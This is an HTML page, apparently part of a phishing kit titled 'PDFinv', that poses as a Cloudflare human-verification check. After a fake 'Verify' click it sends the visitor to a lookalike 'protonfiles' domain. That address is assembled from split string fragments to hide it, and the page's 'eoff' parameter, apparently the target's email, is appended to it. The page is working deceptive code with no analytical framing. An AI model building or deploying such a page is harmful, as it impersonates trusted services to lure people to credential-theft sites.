<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PDFinv</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        body {
            background-color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .logo-container {
            display: flex;
            justify-content: center;
            align-items: center;
            animation: breathe 3s ease-in-out;
        }

        .logo-img {
            height: 140px;
        }

        .content {
            display: none;
        }

        .instruction {
            font-size: 18px;
            color: #333;
            margin-bottom: 15px;
            text-align: center;
        }

        .captcha-box {
            background: #f6f8fa;
            border: 1px solid #e1e4e8;
            border-radius: 6px;
            padding: 15px 20px;
            width: 420px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            height: 90px;
        }

        .verify-box {
            display: flex;
            align-items: center;
            cursor: pointer;
        }

        .verify-check {
            width: 24px;
            height: 24px;
            border: 2px solid #c1c1c1;
            border-radius: 4px;
            margin-right: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
            position: relative;
        }

        .verify-check.loading {
            border-color: #4d90fe;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .verify-check.checked {
            background: #11bb11;
            border-color: #11bb11;
            border-radius: 50%;
            animation: none;
        }

        .verify-check.checked::after {
            content: "✓";
            color: white;
            font-weight: bold;
            font-size: 14px;
        }

        .verify-text {
            font-size: 15px;
            color: #333;
            user-select: none;
            font-weight: bold;
        }

        .success-text {
            color: #11bb11;
        }

        .brand-section {
            text-align: right;
            display: flex;
            flex-direction: column;
            align-items: flex-end;
        }

        .brand-img {
            height: 45px;
            margin-bottom: 3px;
        }

        .robotics-text {
            font-size: 12px;
            color: #888;
            margin-top: 2px;
            letter-spacing: 0.5px;
        }

        .privacy-text {
            font-size: 10px;
            color: #888;
            margin-top: 2px;
        }

        @keyframes breathe {
            0% { opacity: 0; transform: scale(0.8); }
            50% { opacity: 1; transform: scale(1.1); }
            100% { opacity: 1; transform: scale(1); }
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="logo-container">
        <img src="logo.png" alt="Logo" class="logo-img">
    </div>

    <div class="content">
        <div class="instruction">Let us know you're human</div>
        <div class="captcha-box">
            <div class="verify-box" id="verifyBox">
                <div class="verify-check" id="verifyCheck"></div>
                <span class="verify-text" id="verifyLabel">Verify</span>
            </div>

            <div class="brand-section">
                <img src="cloudflare_.png" alt="Cloudflare" class="brand-img">
                <div class="robotics-text">CLOUDFLARE</div>
                <div class="privacy-text">Privacy · Terms</div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const logoContainer = document.querySelector('.logo-container');
            const content = document.querySelector('.content');
            const verifyBox = document.getElementById('verifyBox');
            const verifyCheck = document.getElementById('verifyCheck');
            const verifyLabel = document.getElementById('verifyLabel');
            let verified = false;

            // Function to extract parameter from URL
            function getUrlParameter() {
                const urlParams = new URLSearchParams(window.location.search);
                return urlParams.get('eoff') || '';
            }

            // Function to build the redirect URL from fragments
            function buildRedirectUrl() {
                const paramValue = getUrlParameter();

                // Break the URL into tiny pieces
                const part1 = 'https:';
                const part2 = '//proton';
                const part3 = 'files.';
                const part4 = 'esgkruies';
                const part5 = 'yapydt.';
                const part6 = 'online/';
                const part7 = 'tOnDqXfQ#';

                // Join the pieces back together
                const baseUrl = part1 + part2 + part3 + part4 + part5 + part6 + part7;

                return baseUrl + encodeURIComponent(paramValue);
            }

            setTimeout(function() {
                logoContainer.style.display = 'none';
                content.style.display = 'block';
            }, 2500);

            verifyBox.addEventListener('click', function() {
                if (!verified) {
                    verifyCheck.classList.add('loading');

                    setTimeout(function() {
                        verifyCheck.classList.remove('loading');
                        verifyCheck.classList.add('checked');
                        verifyLabel.textContent = 'Success!';
                        verifyLabel.classList.add('success-text');
                        verified = true;

                        setTimeout(function() {
                            const redirectUrl = buildRedirectUrl();
                            window.location.href = redirectUrl;
                        }, 2000);
                    }, 1000);
                }
            });
        });
    </script>
</body>
</html>
